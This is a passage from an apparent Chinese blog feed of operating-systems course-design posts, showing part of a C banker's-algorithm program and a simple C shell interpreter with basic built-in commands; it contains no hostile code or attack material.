class="hljs-comment">//资源类数</span><br><span class="hljs-keyword">int</span> *Available; <span class="hljs-comment">//可使用资源向量</span><br><span class="hljs-keyword">int</span> **Max;  <span class="hljs-comment">//最大需求矩阵</span><br><span class="hljs-keyword">int</span> **Allocation;    <span class="hljs-comment">//分配矩阵</span><br><span class="hljs-keyword">int</span> **Need; <span class="hljs-comment">//需求矩阵</span><br><span class="hljs-keyword">bool</span> safe = False;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">int</span> *req_src;<br>&#125;Request;<br>Request* new_request;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initial</span><span class="hljs-params">()</span></span>;  <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">safe_detect</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">vector_compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span></span>;  <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> len)</span></span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    initial();<br>    request();<br>    process();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;len)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d&quot;</span>,*(a+i));<br>        i++;<br>    &#125;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br> <br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">vector_compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span>    <span class="hljs-comment">// If vector a &gt;= vector b, return True</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;len)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(*(a+i)&lt;*(b+i))<br>            <span class="hljs-keyword">return</span> False;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> True;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span> <span class="hljs-comment">//vector a += vector b</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;len)<br>    &#123;<br>        *(a+i) += *(b+i);<br>        i++;<br>    &#125; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vector_sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b, <span class="hljs-keyword">int</span> len)</span> <span class="hljs-comment">//vector a -= vector b</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;len)<br>    &#123;<br>        *(a+i) -= *(b+i);<br>        i++;<br>    &#125; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initial</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> j;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入进程数:\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入资源类数:\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;m);    <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入可使用资源向量:\n&quot;</span>);<br>    Available = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;Available[i]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入最大需求矩阵:\n&quot;</span>);<br>    Max = (<span class="hljs-keyword">int</span>**)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>*)*n);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>    &#123;<br>        Max[i] = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;m; j++)<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;Max[i][j]);<br>    &#125;<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入分配矩阵:\n&quot;</span>);<br>    Allocation = (<span class="hljs-keyword">int</span>**)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>*)*n);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>    &#123;<br>        Allocation[i] = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;m; j++)<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;Allocation[i][j]);<br>    &#125;<br><br>    Need = (<span class="hljs-keyword">int</span>**)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>*)*n);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        Need[i] = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;m;j++)<br>            Need[i][j] = Max[i][j] - Allocation[i][j];<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i,id;<br>    new_request = (Request*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Request));<br>    new_request-&gt;req_src = (<span class="hljs-keyword">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)*m);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入进程的ID\n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;id);<br>    new_request-&gt;id = id - <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入进程申请资源向量\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;new_request-&gt;req_src[i]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i = new_request-&gt;id;<br>    <span class="hljs-keyword">if</span>(vector_compare(Need[i],new_request-&gt;req_src,m))<br>        &#123;<br>            <span class="hljs-keyword">if</span>(vector_compare(Available,new_request-&gt;req_src,m))<br>            &#123;<br>                vector_sub(Available,new_request-&gt;req_src,m);<br>                vector_add(Allocation[i],new_request-&gt;req_src,m);<br>                vector_sub(Need[i],new_request-&gt;req_src,m);<br>                safe_detect();<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;程序所申请资源大于系统当前所剩资源，推迟执行!\n&quot;</span>);  <br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>                              <br>        &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;程序所申请资源大于该程序所需资源，无法执行!\n&quot;</span>); <br>        <span class="hljs-keyword">return</span>;<br>    &#125;    <br>    <span class="hljs-keyword">if</span>(safe)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;系统安全,进程可以执行!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;系统不安全,进程无法执行!\n&quot;</span>);<br>        vector_add(Available,new_request-&gt;req_src,m);<br>        vector_sub(Allocation[i],new_request-&gt;req_src,m);<br>        vector_add(Need[i],new_request-&gt;req_src,m);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>        <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">safe_detect</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> *work = Available;<br>    <span class="hljs-keyword">bool</span> *finish = (<span class="hljs-keyword">bool</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">bool</span>)*n);<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-comment">//初始化finish</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>        finish[i] = False;<br>    <br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(finish[i]==False&amp;&amp;vector_compare(work,Need[i],m))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;尝试执行第%d进程\n&quot;</span>,i+<span class="hljs-number">1</span>);<br>            vector_add(work,Allocation[i],m);   <span class="hljs-comment">//尝试执行该进程，释放资源</span><br><br>            finish[i] = True;<br>            i = <span class="hljs-number">-1</span>;  <span class="hljs-comment">//尝试分配后，从头查找是否还有可以执行的进程，考虑到i++，故此处为-1</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;n; i++)<br>        <span class="hljs-keyword">if</span>(finish[i]==False)<br>            <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span>(i==n)<br>        safe = True;<br>    <span class="hljs-keyword">else</span><br>        safe = False;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果如图所示：</p><p><img src="/images/OS/image-20210622155346538.png" alt="效果"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单shell命令行解释器的设计与实现</title>
      <link href="/2021/06/22/%E7%AE%80%E5%8D%95-shell-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%A7%A3%E9%87%8A%E5%99%A8-%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E-%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/06/22/%E7%AE%80%E5%8D%95-shell-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%A7%A3%E9%87%8A%E5%99%A8-%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E-%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>我们总会站在前人的肩膀上去眺望远方，无论是课程设计还是人生皆如此。</p><h3 id="简单shell命令行解释器的设计与实现"><a href="#简单shell命令行解释器的设计与实现" class="headerlink" title="简单shell命令行解释器的设计与实现"></a>简单shell命令行解释器的设计与实现</h3><p>要设计的 shell 类似于 sh,bash,csh 等，必须支持以下内部命令：</p><ul><li><strong>cd</strong> &lt;目录&gt;更改当前的工作目录到另一个&lt;目录&gt;。如果&lt;目录&gt;未指定，输出当前工作目录。如果&lt;目录&gt;不存在，应当有适当的错误信息提示。这个命令应该也能改变 <strong>PWD</strong> 的环境变量。</li><li><strong>environ</strong> 列出所有环境变量字符串的设置（类似于 Linux 系统下的 <strong>env</strong> 命令）。</li><li><strong>echo</strong> &lt; 内容 &gt; 显示 echo 后的内容且换行。</li><li><strong>help</strong> 简短概要的输出你的 shell 的使用方法和基本功能。</li><li><strong>jobs</strong> 输出 shell 当前的一系列子进程，必须提供子进程的命名和 PID 号。</li><li><strong>quit</strong>,<strong>exit</strong>,bye <strong>退出</strong> shell。</li></ul><p>提示：shell 的主体就是反复下面的循环过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br><span class="hljs-comment">//接收用户输入的命令行；</span><br><span class="hljs-comment">//解析命令行；</span><br><span class="hljs-keyword">if</span>(<span class="hljs-comment">//用户命令为内部命令)</span><br><span class="hljs-comment">//直接处理；</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-comment">//用户命令为外部命令)</span><br><span class="hljs-comment">//创建子进程执行命令；</span><br><span class="hljs-keyword">else</span><br><span class="hljs-comment">//提示错误的命令；</span><br>&#125;<br></code></pre></td></tr></table></figure><p>实现代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">command</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-number">4</span>))        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;q&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;quit&quot;</span>,<span class="hljs-number">4</span>))   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;q&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;bye&quot;</span>,<span class="hljs-number">4</span>))    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;q&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;cd&quot;</span>,<span class="hljs-number">2</span>))     <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-number">2</span>))     <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;rm&quot;</span>,<span class="hljs-number">2</span>))     <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;mkdir&quot;</span>,<span class="hljs-number">5</span>))  <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;echo&quot;</span>,<span class="hljs-number">4</span>))   <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;help&quot;</span>,<span class="hljs-number">4</span>))   <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;env&quot;</span>,<span class="hljs-number">3</span>))    <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!strncasecmp(s,<span class="hljs-string">&quot;jobs&quot;</span>,<span class="hljs-number">4</span>))   <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!strncasecmp(s,<span class="hljs-string">&quot;clean&quot;</span>,<span class="hljs-number">5</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">help</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>( <span class="hljs-string">&quot;\t*****************帮助********************\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   命令                     功能\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   cd            更改当前的工作目录到另一个&lt;目录&gt;\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   environ       列出所有环境变量字符串的设置\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   echo          显示echo后面的内容并换行\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   help          显示帮助信息\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   jobs          输出shell当前的一系列子进程，包括子进程的命名和PID号\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   ls            显示当前目录的所有文件\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   rm            删除当前目录下的文件或目录\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   mkdir         在当前目录下创建新目录\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   clean         清屏\n&quot;</span><br>            <span class="hljs-string">&quot;\t*   quit|exit|bye 退出shell\n&quot;</span><br>            <span class="hljs-string">&quot;\t*****************************************\n&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> n[<span class="hljs-number">100</span>],n1[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">char</span> b;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    help();<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(n,<span class="hljs-number">0</span>,<span class="hljs-number">100</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s_@_$：&quot;</span>,getcwd(n1,<span class="hljs-number">100</span>));           <span class="hljs-comment">// print the information;</span><br>        fgets(n,<span class="hljs-number">100</span>,<span class="hljs-built_in">stdin</span>);                         <span class="hljs-comment">//input cmdline;</span><br>        n[<span class="hljs-built_in">strlen</span>(n)<span class="hljs-number">-1</span>]=<span class="hljs-string">&#x27;\0&#x27;</span>;                        <span class="hljs-comment">//delete the &#x27;\n&#x27;;</span><br>        b=command(n);                               <span class="hljs-comment">//get the return values;</span><br>        <span class="hljs-keyword">if</span>(b==<span class="hljs-string">&#x27;q&#x27;</span>)<br>            <span class="hljs-keyword">break</span>;                                  <span class="hljs-comment">//exit the shell;</span><br>        <span class="hljs-keyword">switch</span>(b)<br>        &#123;<br>        <span class="hljs-comment">//change the directory</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span>(chdir(n+<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   打开工作目录(%s)失败!\n&quot;</span>,n+<span class="hljs-number">3</span>);<span class="hljs-comment">//+3  = &#x27;c&#x27;,&#x27;d&#x27;,&#x27;\0&#x27;,后面的数字为输入命令的字符个数加+1（‘\0’占一个字符）;</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   当前工作目录：&#x27;%s&#x27;\n&quot;</span>,getcwd(n1,<span class="hljs-number">100</span>));<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//list</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">if</span>((pid=fork())&lt;<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   fork error\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(execl(<span class="hljs-string">&quot;/bin/ls&quot;</span>,<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-literal">NULL</span>)&lt;<span class="hljs-number">0</span>);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   execl error\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<br>            waitpid(pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//remove a directory</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            remove(n+<span class="hljs-number">3</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   文件已删除!\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//make a directory</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            mkdir(n+<span class="hljs-number">6</span>,S_IRWXU);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   文件创建成功!\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//print something</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   %s\n&quot;</span>,n+<span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//help</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            help();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//environment</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            <span class="hljs-keyword">if</span>((pid=fork())&lt;<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   fork error\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(execl(<span class="hljs-string">&quot;/bin/env&quot;</span>,<span class="hljs-string">&quot;env&quot;</span>,<span class="hljs-literal">NULL</span>)&lt;<span class="hljs-number">0</span>)<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   execl error\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<br>            waitpid(pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//ps the running process ;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            system(<span class="hljs-string">&quot;ps&quot;</span>);<span 